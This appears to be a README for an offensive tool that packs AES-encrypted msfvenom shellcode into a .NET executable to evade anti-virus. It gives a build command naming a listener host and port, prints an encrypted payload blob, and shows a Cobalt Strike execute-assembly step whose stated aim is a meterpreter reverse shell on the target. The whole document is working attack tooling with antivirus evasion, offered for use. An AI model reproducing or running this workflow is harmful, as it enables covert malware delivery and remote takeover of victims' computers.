# ShellcodeEncryptor
A simple shell code encryptor/decryptor/executor to bypass anti virus.

# Purpose
To generate a .Net binary containing base64 encoded, AES encrypted shellcode that will execute on a target, bypassing anti-virus.

# Instructions

Use the `builder.py` to create the executable (you will need `mono` installed on your Linux box:
```
root@kali:~# ./launcher.py --lport 4444 --lhost 192.168.1.109 --key atomicritual --filename boom.exe
[+] Generating MSFVENOM payload...
[+] Generating encryptor.cs file...
[+] Compiling the encryptor...
[+] Running the encryptor...
j1y53uhGm57pz49cJPlsa8CdtciBnIJZpcgcK09jWiffpDtQ+1YJheKTBoLGyLStkoA4pcEcEWA+QF1X0wfJ/SYnrIOelXxLWP86BLe0Doz54euNBetYsReSynQ5ibQjY1CgHntgkZ/sXjFNjpVAyOUVFZjaDlV/upLGaNWUu25vHs80R2IDdV5kn66CSc4/mcfkRhhFC7Y9xNtPuDihF7yRI+HJrlqfoDuo+fI5I20UqWKWkaejJMpgicChzE9EuulQtxAZkqwxPBoCmSkFYm9hVr8OWlWFZj46cRO3lHp0y7Tqg/KgxMdr/59CK9cLzIqNFOBJxsuyVZTxa+MKGXbVF3BhzECpHFTJ/lQYYb2P5emT9Kv9kFPaehOqn5SOXn61FtrkuR24MhCMhatIqVhrzS5phlkebIc6tf4ieee1BnHe262FWBAVm8N5HJ7HoFN+ZASfkGuPL5yqiz10Ew==
[+] Generating launcher.cs file...
[+] Compiling the launcher...
[+] Launcher compiled and written to ./boom.exe
[+] Have a nice day!
```

Take the resulting executable and run it on the target, for example (Cobalt Strike):
```
execute-assembly ./uploads/boom.exe
```

Hopefully you will have a nice meterpreter shell.

# Note

The .cs files are provided as a reference.
